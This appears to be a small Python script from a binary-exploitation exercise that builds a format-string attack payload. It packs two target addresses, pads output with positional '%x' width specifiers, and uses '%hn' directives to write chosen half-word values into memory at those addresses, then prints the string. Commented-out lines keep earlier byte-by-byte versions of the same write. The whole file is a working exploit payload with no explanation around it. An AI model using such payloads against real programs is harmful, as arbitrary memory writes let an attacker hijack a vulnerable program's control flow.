address1 = '\xe0\x97\x04\x08'
# address2 = '\xe1\x97\x04\x08'
address3 = '\xe2\x97\x04\x08'
# address4 = '\xe3\x97\x04\x08'

write1 = '%10$hn'
write2 = '%11$hn'
write3 = '%12$hn'
write4 = '%13$hn'

# byte1 = '%1$255x'
# byte2 = '%1$255x'
# byte3 = '%1$219x'
# byte4 = '%1$111x'

# byte1 = '%1$239x'
# byte2 = '%1$255x'
# byte3 = '%1$219x'
# byte4 = '%1$111x'

dbyte1 = '%1$56167x'
dbyte2 = '%1$9360x'

# string = address0 + address1 + address2 + address3 + byte1 + write1 + byte2 + write2 + byte3 + write3 + byte4 + write4
# string = address1 + address3 + dbyte1 + write1
string = address1 + address3 + dbyte1 + write1 + dbyte2 + write2

print(string)